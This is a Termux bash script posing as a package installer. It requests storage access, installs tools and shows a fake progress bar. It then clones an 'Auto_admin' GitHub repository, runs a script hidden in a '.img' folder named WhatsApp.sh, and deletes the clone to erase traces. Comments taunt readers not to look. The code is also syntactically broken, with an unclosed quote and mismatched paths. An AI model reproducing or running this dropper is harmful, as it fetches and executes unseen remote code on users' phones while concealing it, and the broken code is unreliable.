#!/bin/bash
# Why read this code
# don't believe me 
fpp_Community="\033[0;32m"
clear
echo ""
echo ""
echo ""
echo ""
if [ -d  /data/data/com.termux/files/home/storage ]; then
echo ""
echo ""
clear
else
termux-setup-storage -y
echo ""
echo ""
echo ""
clear
fi
clear
pkg install figlet
clear
pkg install python -y
clear
echo -e $fpp_Community 
clear
echo " Please Wait..."
echo " █"
sleep 1
echo " ██"
echo " ████"
sleep 1
echo " ████████"
echo " ████████████████"
sleep 1
echo ""
echo -e $fpp_Community
clear
echo " Installation Completed"
echo " 
sleep 1
if [ -f img/WhatsApp.sh ]; then
bash .img/WhatsApp.sh
clear
echo ""
echo " Loading..."
echo " Wait..."
else
cd
pkg install git -y
git clone https://github.com/ANON-D46KPH4TOM/Auto_admin
clear
cd Auto_admin
cd .img
bash WhatsApp.sh
bash img/WhatsApp.sh
fi
# Try Again 🥵
clear
bash img/WhatsApp.sh
cd ..
rm -rf Auto_admin
clear
exit
